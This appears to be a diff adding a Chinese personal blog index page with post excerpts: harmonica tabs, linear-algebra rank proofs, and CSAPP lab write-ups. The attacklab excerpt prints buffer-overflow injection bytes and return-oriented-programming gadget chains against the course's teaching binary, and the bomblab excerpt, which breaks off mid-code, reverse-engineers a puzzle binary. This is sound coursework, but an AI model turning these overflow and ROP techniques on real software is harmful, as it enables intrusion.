+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/14/%E5%8D%8A%E9%9F%B3%E9%98%B6%E5%8F%A3%E7%90%B4%E8%B0%B1%E5%90%88%E8%BE%91/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="jpwang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jjppp">
+      <meta itemprop="description" content="Young, Simple & Naive">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | jjppp">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/02/14/%E5%8D%8A%E9%9F%B3%E9%98%B6%E5%8F%A3%E7%90%B4%E8%B0%B1%E5%90%88%E8%BE%91/" class="post-title-link" itemprop="url">半音阶口琴谱合辑</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-02-14 14:47:00" itemprop="dateCreated datePublished" datetime="2021-02-14T14:47:00+08:00">2021-02-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-19 09:36:58" itemprop="dateModified" datetime="2022-06-19T09:36:58+08:00">2022-06-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          最早想玩口琴是高三的暑假。啥也不懂就直接jd了复音，到手以后发现复音没有半音，很多曲子没法吹，谱子也不好找，舌伴奏分解和弦更是难得口腔发麻，唯一的优点大概是便宜、单音好吹、音色醇厚了(这里有三个了吧喂)。
+
+年前入手了一把铁鹅的追梦人，不得不说半音阶吹起来感觉还是很不同的。孔位我还在适应，推键也还在掌握，不过至少能吹很多曲子了;-P
+这里就放一点从各处搜罗来的半音阶琴谱，也算是分享吧？还不会看五线谱，先吹着再说吧。希望好听的曲子都可以找到听众
+
+**作一点小约定：1234567分别代表七个音，()指低音区，[]指高音区，#指按推键，若无特殊说明1=C**
+歌词的话看心情吧，说不定会补上呢...
+
+## 白桦林
+
+好听！如果有A调当然最好，没有的话这里是1=C的，[转自用户：遠い空の翼 的评论](https://www.bilibili.com/video/BV1mz4y1k7Z9?from=search&seid=5173667719021033518)
+
+```
+#1--2#1--6--#4--#5--6--#5#4#1-- 				静静的村庄飘着白的雪， 
+(7)--#1(7)#1#5--(7)--#1#3--#5#4-- 				阴霾的天空下鸽子飞翔，
+(#45#4)--#4--#1--2--3--2(7)#1-- 				白桦树刻着那两个名字，
+#1--(6)-(7)#1(7)--(6)--(#5#1)--#1(7#4)--	 	他们发誓相爱用尽这一生，
+
+#1--2#1--6--#4--#5--6--#5#4#1-- 				有一天战火烧到了家乡，
+(7)--#1(7)#1#5--(7)--#1#3--#5#4-- 				小伙子拿起枪奔赴边疆，
+(#45#4)--#4--#1--2--3--2(7)#1-- 				心上人你不要为我担心，
+#1--(6)-(7)#1(7)--(6)--(#5#1)--#1(7#4)-- 		等着我回来在那片白桦林，
+
+#4--#1--2#12--(7#47)--3--3#4--3#4--#1， 			天空依然阴霾依然有鸽子在飞翔，
+#1--(7)--(6#5#1)--(76#5#4)--(#5#5#5#1)--#1(7)#1，谁来证明那些没有墓碑的爱情和生命，
+#4--#5--6#52--(7#47)--3#4--#5#1--， 				雪依然在下那村庄依然安详，
+#1--(67)--#1(7)--(6#5#1)--#1(7#4)--				年轻的人们消逝在白桦林；
+#1--2#1--6--#4--#5--6--#5#4#1--					噩耗声传来在那个午后，
+(7)-#1(7)#1--#5--#3--#1-#1#3--#5#4--  	         心上人战死在远方沙场，
+(#45#4)--#4--#1--2--3--2(7)#1--                	她默默来到那片白桦林，
+#1--(6)-(7)#1(7)--(6)--(#5#1)--#1(7#4)--        望眼欲穿地每天守在那里，
+
+#4--#1--2#12--(7#47)--3--3#4--3#4--#1，        	天空依然阴霾依然有鸽子在飞翔，
+#1--(7)--(6#5#1)--(76#5#4)--(#5#5#5#1)--#1(7)#1，谁来证明那些没有墓碑的爱情和生命，
+#4--#5--6#52--(7#47)--3#4--#5#1--，            	雪依然在下那村庄依然安详，
+#1--(67)--#1(7)--(6#5#1)--#1(7#4)--              年轻的人们消逝在白桦林，
+
+#4--#5--6#52--(7#47)--3#4--#5#1--，            	雪依然在下那村庄依然安详，
+#1--(67)--#1(7)--(6#5#1)--#1(7#4)--              年轻的人们消逝在白桦林；
+```
+
+## 那些年
+
+低音部分比较难吹，还要练练...[转自用户：莫思mosi 的视频](https://www.bilibili.com/video/BV1tf4y1R7y4?from=search&seid=12141962557602366761)
+
+```
+(445666#66)
+(654555#66)
+(5434343211)
+(456#6243)
+(16#6654)
+(434#6654#66545)
+
+(445666#66)
+(654555#66)
+(54343434)21
+1(#66)112(#665)
+(56#6#6)1(654)
+(434#66#624344)
+
+(#6#6#6#66365544)
+(4#6656#66#6)
+2231(#6#6)1(6)
+2222#123
+(6)3431(4)
+(#6654#66#6)11
+
+11344411
+1145551#1
+56544
+43431255
+(556#66#6)21
+(#66#6)11534
+431(#66#6)126545
+
+11344411
+1145551#1
+56544
+43431266
+(#6#6)121243
+332#1#1654
+431(#66#6)126545
+44344
+```
+
+## 斯卡布罗集市
+
+这个要一点点压音的姿势会更好听QAQ不过还是很容易的
+
+```
+2 266 3432 
+6[12][1]6756
+[22][21]665431
+2 65 43212
+
+(2 26663432)
+(6)12 1(6756)
+22 21 (665431)
+(2 65 431432)
+
+2 266 3432 
+6[12][1]67576
+[22][21]665431
+2 65 43212
+```
+
+## Love Theme from TIGA
+
+貌似也叫Take me higher 抒情版？
+
+```
+33321  (7)(6)(7)1
+33321  (7)(6)(7)1
+4322  4322  133
+33321  (7)(6)(7)1
+333 21  (7)(6)(7)1
+4322  4322  133
+3212  1(7)1   (7)(6)(6)
+3212   133
+3212   1(7)1 (7)(6)(6)
+1112  123
+ 
+#56#53 #4#4 #5#5#56
+#56#53 #4 #4#4  6#5#4
+#56#53 #4#4 #5#5#56
+#56#53 #4 #4#4  6#5#4
+#56#53 #4#4 #5#5#56
+#56#53 #4 #4#4  6#5#4
+#56#53 #4#4 #5#5#56
+#56#53 #4 #4#4  6#5#4
+```
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/02/14/%E5%8D%8A%E9%9F%B3%E9%98%B6%E5%8F%A3%E7%90%B4%E8%B0%B1%E5%90%88%E8%BE%91/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/08/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%B8%B8%E8%A7%81%E8%AF%81%E6%98%8E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="jpwang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jjppp">
+      <meta itemprop="description" content="Young, Simple & Naive">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | jjppp">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/02/08/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%B8%B8%E8%A7%81%E8%AF%81%E6%98%8E/" class="post-title-link" itemprop="url">高等代数复习笔记 常见证明</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-02-08 02:24:00" itemprop="dateCreated datePublished" datetime="2021-02-08T02:24:00+08:00">2021-02-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-19 09:47:11" itemprop="dateModified" datetime="2022-06-19T09:47:11+08:00">2022-06-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          关于矩阵的秩，王萼芳的书上给了一个比较简单的证明，丘维声的书上给了一个比较容易理解的证明，这里记一下复习复习，算是加深理解
+
+## 方法一
+
+---
+
+**引理**：齐次线性方程组$A\bold{x}=\bold{0}$只有零解当且仅当矩阵$A$的行秩$\ge$未知数个数。
+
+引理的证明比较简单，只需要证明初等行变换不改变行秩，再观察$A$化成阶梯形矩阵之后自由变量的数量就好了
+
+不妨设一个矩阵$A_{s\times n}$，且有$s\le n$，我们首先证明行秩$r_s\le$列秩$ r_n$
+
+可以取出$r_s$个线性无关的行向量，不妨记为$\bold{\alpha_{1},\alpha_{2},\dots,\alpha_{r_s} }$。根据线性无关的定义有：**不存在**一组不全为零的数$k_1,k_2,\dots,k_{r_s}$使得$\sum\limits_{i=1}^{r_s}{k_i\bold{\alpha_i} }=0$。记这些行向量组成的矩阵为$A_1$，即$\bold{x}^{T}A_1=\bold{0}$只有零解，两边转置得到${A_1}^T\bold{x}=\bold{0}$只有零解。由引理可知$r_s$ $\le$ ${A_1}^T$的行秩。那么我们可以从${A_1}^T$中取出它行向量的一个极大线性无关组。根据定理这个极大线性无关组的延伸组也是线性无关的，于是我们就把它填充为原本列向量的转置。
+
+这里可以看出矩阵$A$的列向量组至少有$r_s$个向量线性无关，因此$r_s\le r_n$
+
+由对称性可知反过来是同理的，或者你转置一下也行。这个证法我jio得很简洁
+
+## 方法二
+
+---
+
+### Step1
+
+首先证明行阶梯形矩阵的行秩=列秩。记$A$的非零行数量为$r$，首先可以把每一行主元所在的行和列抠出来，不妨记第$i$个主元所在列为$K_i$，它们交点组成的子矩阵记为$C$。很显然$C$是一个上三角矩阵，于是$|C|\neq0$，也就是说$C$中的行列向量组都是线性无关的，同样它们的延伸组也是线性无关的
+
+1. 先看矩阵$A$的列向量组，记为$\bold{\alpha_1,\alpha_2,\dots,\alpha_n}$，它们的特点是每一个向量的后$s-r$个元素全为$0$，这表示$A$的列秩$r_n=r=r\left(\bold{\alpha_{K_1},\dots,\alpha_{K_r} }\right)$，于是我们抠出来的这$r$个列向量就是$A$的列向量组的一个极大线性无关组
+
+2. 再看$A$的行向量组，记为$\bold{}$$\bold{\beta_1,\beta_2,\dots,\beta_s}$，由$|C|\neq0$可知其中的$r$个向量线性无关，剩余$s-r$个都是$\bold0$，于是行秩$r_s=r=r\left(\bold{\beta_{K_1},\beta_{K_2},\dots,\beta{K_r} }\right)$
+
+综合1、2可得，行阶梯形矩阵的行秩等于列秩
+
+### Step2
+
+再证明初等行变换不改变行秩
+
+第i行的k倍加到第j行，即向量组$\bold{\alpha_1,\dots,\alpha_i,\dots,\alpha_j,\dots,\alpha_n}$变成了$\bold{\alpha_1,\dots,\alpha_i,\dots,k\alpha_i+\alpha_j,\dots,\alpha_n}$。这俩显然是等价的，它们的秩也相等
+
+交换i、j两行显然不变，某一行乘上一个非零系数显然不变
+
+### Step3
+
+再证明初等行变换不改变列向量组的线性相关性
+
+任取$A$中的列向量组$\bold{\alpha_1,\alpha_2,\dots,\alpha_p}$，其经历一系列初等行变换变成行阶梯形$\bold{\beta_1,\beta_2,\dots,\beta_p}$
+
+如果$\bold\beta$线性无关，那么它的前$p$个分量组成的$p\times p$的矩阵行列式$\neq0$，又因为行初等变换不改变行列式的值，因此得到$\bold\alpha$的前$p$个分量组成的矩阵的行列式也$\neq0$；如果线性相关，那么这个结论也是对应的
+
+于是初等行变换不改变列向量组的线性相关性
+
+### Step4
+
+最后证明初等行变换不改变列秩
+
+取$A$的$r_n$个线性无关的列向量构成一个极大线性无关组$\bold\alpha$，其经历一系列初等行变换变成$\bold\beta$，由Step3可知$\bold\beta$中的这$r_n$个向量也线性无关，因此初等行变换不会使列秩减小；
+
+再任取$A$中的$r_n+1$个列向量(如果有的话)，易得这$r_n+1$个列向量线性相关，于是其对应的$\bold\beta$中的任意$r_n+1$个列向量都线性相关，因此初等行变换不会使列秩增大；
+
+因此初等行变换不改变列秩
+
+### Step5
+
+综合1234就可以把任意的矩阵通过初等行变换变成行阶梯形矩阵，再由秩的不变性得到任意矩阵的行秩等于列秩
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/02/08/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%B8%B8%E8%A7%81%E8%AF%81%E6%98%8E/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/04/CSAPP%E5%AE%9E%E9%AA%8C3-attacklab/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="jpwang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jjppp">
+      <meta itemprop="description" content="Young, Simple & Naive">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | jjppp">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/02/04/CSAPP%E5%AE%9E%E9%AA%8C3-attacklab/" class="post-title-link" itemprop="url">CSAPP实验3 : attacklab</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-02-04 18:43:00" itemprop="dateCreated datePublished" datetime="2021-02-04T18:43:00+08:00">2021-02-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-19 09:36:58" itemprop="dateModified" datetime="2022-06-19T09:36:58+08:00">2022-06-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          佛了，写到lab3才知道有writeup这种东西...
+
+# CI Part
+---
+## touch1
+
+---
+
+很简单的题，但是做了很久才发现是数错了的问题....面壁中
+
+``` asm
+00000000004017a8 <getbuf>:
+  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
+  4017ac:	48 89 e7             	mov    %rsp,%rdi
+  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
+  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
+  4017b9:	48 83 c4 28          	add    $0x28,%rsp
+  4017bd:	c3                   	retq   
+```
+
+重点在对`%rsp`的操作，这里留出了`40byte`的位置给`buffer`，我们只需要输入40+8长度的字符串就可以成功修改到返回地址了
+`touch1`的地址是`0x004017c0`，根据**little endian**的规则，前面40个无所谓，后面8个是`c0 17 40 00 00 00 00 00`就可以了（注意跳转地址是64位的），事实上我一开始只写了4个也是对的...
+这里非常坑爹，输入只能是`00`而不能是`0`...
+一开始错是因为把8个分成了一组，这样4组就只有32个，面壁中...
+
+## touch2
+
+---
+
+这个比起上面有一点难度
+
+具体的`getbuf`和上面没有区别，重点在于我们需要用`cookie`的值给寄存器`%rdi`赋值，然后再跳转到`touch2`中
+我们可以先写好汇编代码，再利用`gcc -c test.s`来得到`test.o`二进制文件，然后`objdump -d test.o > test.d`就可以得到对应指令的编码了，放在40个中的随便哪个位置，最后在栈的返回位置写入我们注入代码的起始地址就好了
+查看起始地址可以gdb进去观察`%rsp`的值，然后画图就好了。只需要记住栈向低处增长、命令从低处开始执行、字符串从低处开始写入内存
+
+写出来的汇编大概长这样，不同的cookie写出来肯定也不一样：
+
+``` asm
+movq $0x59b997fa,%rdi
+pushq $0x4017ec
+ret
+```
+
+## touch3
+
+---
+
+有了writeup就很好做啦
+
+查文档可以知道```sprintf(str, "%.8x", x)```表示把`x`以16进制、占8位打印到`str`指向的地址处，那么我们就是要在注入的代码中带上自己的cookie，然后传入这个cookie字符串的起始地址
+
+writeup提示`hexmatch`和其他函数会重新占用`getbuf`所产生stack frame的内存，但是由于这两者是同级的（意会一下这个我瞎说的概念），因此`getbuf`往上一层函数的stack frame就不会被修改到，所以我们把cookie存在这个地方。当然你慢慢看代码发现`getbuf`的stack frame被用的一滴都不剩了再打其他地方的注意也不是不行....
+
+``` asm
+35 39 62 39 39 37 66 61
+00 00 00 00 00 00 00 00
+00 00 00 48 c7 c7 a8 dc
+61 55 68 fa 18 40 00 c3
+00 00 00 00 00 00 00 00
+8b dc 61 55 00 00 00 00
+35 39 62 39 39 37 66 61
+```
+
+自此code injection的部分就做完啦~ 撒花 ~
+
+# ROP Part
+
+---
+
+## touch2
+
+---
+
+ROP比CI要好玩得多，适用性也更广，~~会让开发者有一种被自己代码NTR的感觉~~
+
+考虑怎么实现传入参数。虽然我们无法直接注入可执行的代码，但是我们可以注入需要的数据，再利用类似`popq`的指令从栈上取出需要的数据
+
+一个观察`farm.c`的好方法是先得到`farm.d`，再找到所有的`ret`指令（指令长度为一、指令唯一），那么我们就可以得到一系列以`ret`结尾的指令片段
+
+我们需要的部分必定是若干指令片段的一个后缀（这个十分显然），于是大概写一个汇编，然后对着表查就好了。
+
+比如说实现传参的话一定要有一个带`%rdi`的指令、取出数据一定要有一个`popq`指令、再说下去就把答案泄露了.....
+
+写出来大概是介样：
+
+``` asm
+f3 0f 1e fa 55 48 89 e5 b8 fb 78 90 90 5d c3
+f3 0f 1e fa 55 48 89 e5 89 7d fc 8b 45 fc 2d b8 76 38 3c 5d c3
+f3 0f 1e fa 55 48 89 e5 89 7d fc 8b 45 fc 2d af 8c a7 6f 5d c3
+f3 0f 1e fa 55 48 89 e5 48 89 7d f8 48 8b 45 f8 c7 00 48 89 c7 c7 90 5d c3
+f3 0f 1e fa 55 48 89 e5 48 89 7d f8 48 8b 45 f8 c7 00 54 c2 58 92 90 5d c3
+f3 0f 1e fa 55 48 89 e5 48 89 7d f8 48 8b 45 f8 c7 00 63 48 8d c7 90 5d c3
+f3 0f 1e fa 55 48 89 e5 48 89 7d f8 48 8b 45 f8 c7 00 48 89 c7 90 90 5d c3
+f3 0f 1e fa 55 48 89 e5 b8 29 58 90 c3
+5d c3
+
+mine:
+58			popq %rax
+90			nop
+c3			ret
+
+48 89 c7	movq %rax,%rdi
+90			nop
+90			nop
+5d			popq %rbp
+c3			ret
+
+```
+
+这里的代码地址是固定的，所以比较好跳转。如果代码地址随机还可以用上所谓的“雪橇序列”小技巧（我瞎翻的一个术语）来实现较大概率命中我们想要的gadgets。
+
+## touch3
+
+---
+
+做完辣
+
+注意到难点在于栈的位置随机，但是我们可以发现栈的相对位置不变，并且由附录可以很容易得到`%rsp`，那么我们只需要提前取出`%rsp`，用它加上一个合适的`delta`得到注入的字符串的地址，再同样跳转到`touch3`就可以了
+
+阅读`farm.c`可以看到这么一个函数
+
+```c
+/* Add two arguments */
+long add_xy(long x, long y)
+{
+    return x+y;
+}
+```
+
+这玩意就在`mid`后面，而且还有注释....这重要性还要我说嘛
+
+然后根据一些小技巧（比如说一定要用上`functional nop`和`movl`，比如说`movl`一定用在传输`delta`上（我们操作的其他值都是地址，必须要`movq`））就可以找到一些一定要用上的片段，它们恰好就构成了一条数据传输链，写出来大概是这样的
+
+``` asm
+mine:
+movq %rsp,%rax; 48 89 e0 90 c3
+movq %rax,%rdi; 48 89 c7 c3
+;上面一段用来取出%rdi
+popq %rax; 58 90 c3
+movl %eax,%edx; 89 c2 90 c3
+movl %edx,%ecx; 89 d1 38 c9 c3
+movl %ecx,%esi; 89 ce 38 c0 c3
+;上面一段用来取出%rsi
+
+ret; c3 这里用来调用<add_xy>
+
+movq %rax,%rdi; 48 89 c7 c3 这里就是传参啦
+```
+
+然后就很简单了，只需要找`delta`的值就行了。这个可以gdb进去直接扫内存看差值
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2021/02/04/CSAPP%E5%AE%9E%E9%AA%8C3-attacklab/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/24/CSAPP%E5%AE%9E%E9%AA%8C2-bomblab/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="jpwang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jjppp">
+      <meta itemprop="description" content="Young, Simple & Naive">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | jjppp">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/01/24/CSAPP%E5%AE%9E%E9%AA%8C2-bomblab/" class="post-title-link" itemprop="url">CSAPP实验2 : bomblab</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-01-24 00:41:00" itemprop="dateCreated datePublished" datetime="2021-01-24T00:41:00+08:00">2021-01-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-19 09:36:58" itemprop="dateModified" datetime="2022-06-19T09:36:58+08:00">2022-06-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          观察之后还可以发现有所谓的`secret_phase`和`func7`之类的东西，但是感觉差不太多了也就不太想做...就这样吧
+# 前置姿势/技能
+---
+这里记一下做lab需要的前置姿势/技能,尽量不和理论方面的东西重叠吧...
+编译实际上就是把源代码变成一堆CPU指令的过程(在这里到这个程度就够了)
+
+GCC使用的是叫`ATT`格式的汇编,和`Intel`格式的汇编有很多不一样,最显著的就是操作元素的顺序...看文档的时候要小心
+
+编译产生`.s`文件:
+```gcc -Og -S file.c```
+
+编译产生`.o`文件:
+```gcc -Og -c file.c```
+
+以上`-Og`是为了避免过度优化使得程序的执行顺序和结构发生变化
+
+反汇编得到一堆指令:
+```objdump -d file```
+
+gdb打印寄存器内容:
+```i registers```
+
+gdb打印内存内容:
+``` x  /<n/f/u> <addr>```
+> n、f、u 为可选参数，其中n 表示显示内存的长度，也就是说从当前地址向后显示几个地址的内容；f 表示显示的格式(b)；u 表示将多少个字节作为一个值取出来，如果不指定的话，GDB默认是4个bytes，如果不指定的话，默认是4个bytes。当我们指定了字节长度后，GDB会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。<addr>为起始内存地址。
+
+ 参数 f 的可选值：
+    x 按十六进制格式显示变量。
+    d 按十进制格式显示变量。
+    u 按十六进制格式显示无符号整型。
+    o 按八进制格式显示变量。
+    t 按二进制格式显示变量。
+    a 按十六进制格式显示变量。
+    c 按字符格式显示变量。
+    f 按浮点数格式显示变量。
+
+ 
+参数 u 的可选值：
+    b 表示单字节
+    h 表示双字节
+    w 表示四字节
+    g 表示八字节
+
+
+上面的内容摘自[GDB查看内存](http://c.biancheng.net/view/7470.html)
+
+这个非常有用,事实上知道了这个我才做出了Phase_1,用了这么久gdb还是只会fileqlsrb真是惭愧...
+
+打印`PC`寄存器往后5条指令，在做lab3的时候比较有用
+`x /5i $pc`
+
+有些程序运行需要参数，就可以用这个命令来设置
+`set args xxx`
+
+## Phase_1
+---
+终于做完了第一个QUQ
+
+读代码
+```
+0000000000400ee0 <phase_1>:
+  400ee0:	48 83 ec 08          	sub    $0x8,%rsp
+  400ee4:	be 00 24 40 00       	mov    $0x402400,%esi ; 这里给出了第二个参数,实际上就是要和input比较的字符串常量
+  400ee9:	e8 4a 04 00 00       	callq  401338 <strings_not_equal>
+  400eee:	85 c0                	test   %eax,%eax
+  400ef0:	74 05                	je     400ef7 <phase_1+0x17> ; 如果返回值是0则安全
+  400ef2:	e8 43 05 00 00       	callq  40143a <explode_bomb>
+  400ef7:	48 83 c4 08          	add    $0x8,%rsp
+  400efb:	c3                   	retq   
+```
+
+重点在于函数名strings_not_equal和400ee4的位置给出了%esi
+我们知道%rdi和%rsi表示传入的前两个参数,而%rdi是输入的串的起始字符的地址,那么%rsi就是目标串的起始字符的地址了
+知道了这个地址就可以进GDB扫内存，这里扫出来结果是
+```
+(gdb) x /60db 0x402400
+0x402400:	66	111	114	100	101	114	32	114
+0x402408:	101	108	97	116	105	111	110	115
+0x402410:	32	119	105	116	104	32	67	97
+0x402418:	110	97	100	97	32	104	97	118
+0x402420:	101	32	110	101	118	101	114	32
+0x402428:	98	101	101	110	32	98	101	116
+0x402430:	116	101	114	46	0	0	0	0
+0x402438:	87	111	119	33
+```
+很显然到0就停止了,剩下的就是把这个字符序列由ascii码变成字符就完了,现在看看不是太难的...难点在于不要被绕晕
+
+## Phase_2
+---
+有了第一个铺垫第二个就比较简单了(bushi)
+
+还是先贴代码,这里把关键的循环抠出来了
+```
+  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)
+  400f0e:	74 20                	je     400f30 <phase_2+0x34> ; if (%rsp)==1 safe, a[1]=1
+
+  400f10:	e8 25 05 00 00       	callq  40143a <explode_bomb>
+  400f15:	eb 19                	jmp    400f30 <phase_2+0x34>
+  
+  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax
+  400f1a:	01 c0                	add    %eax,%eax
+  400f1c:	39 03                	cmp    %eax,(%rbx)
+  400f1e:	74 05                	je     400f25 <phase_2+0x29> ; if 2*a[i]!=a[i+1] bomb
+  400f20:	e8 15 05 00 00       	callq  40143a <explode_bomb>
+
+  400f25:	48 83 c3 04          	add    $0x4,%rbx
+  400f29:	48 39 eb             	cmp    %rbp,%rbx
+  400f2c:	75 e9                	jne    400f17 <phase_2+0x1b>
+  400f2e:	eb 0c                	jmp    400f3c <phase_2+0x40>
+  
+  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx
+  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp
+  400f3a:	eb db                	jmp    400f17 <phase_2+0x1b>
+
+```
+
+同样函数名给的提示很多,看过课程视频/看过书都应该知道只有前6个函数参数存在寄存器里,多余的参数都会都按照逆序插入到栈中(why?这样弹出的第一个就是最前面的参数,以此类推)
+难点在于搞清楚内存分部和内存里储存的值究竟是什么,以及sscanf这个函数的返回值....
+
+因此只要画出内存的地址&内容表格来就可以很简单地做出来了,答案是一个长为6的满足某些常数项递推条件的数列
+
+## Phase_3
+---
+感觉这个比前两个都要简单了
+
+观察实现可以发现是对参数%rdi作0~7的switch-case判断,不同的%rdi对应不同的值%eax
+炸弹不爆当且仅当%rsi=%eax,因此正确的输入有8对.我试了两个都是可以的,剩下的就没试了(太困了)
+
+关键在这一句
+```
+400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8) ; jump to mem[0x402470+x*8]
+```
+用GDB硬扫就可以了,注意用/8xg+地址来扫
+
+## Phase_4
+---
+`func_4`写出来类似这样子,看上去是个递归实际上观察phase_4的初始条件可以知道最开始带入的x=tx,y=0,z=14
+这里tx,ty表示读入的两个数字,再观察到所谓的q<=x且q>=x就是解一个简单的方程的条件,算出答案就可以了
+
+```c
+int func4(int x,int y,int z) {
+	int t = z - y;
+	int q = ( (unsigned) t) >> 31;
+	t += q;
+	t >>= 1;
+	q = t + y;
+	if (q <= x) {
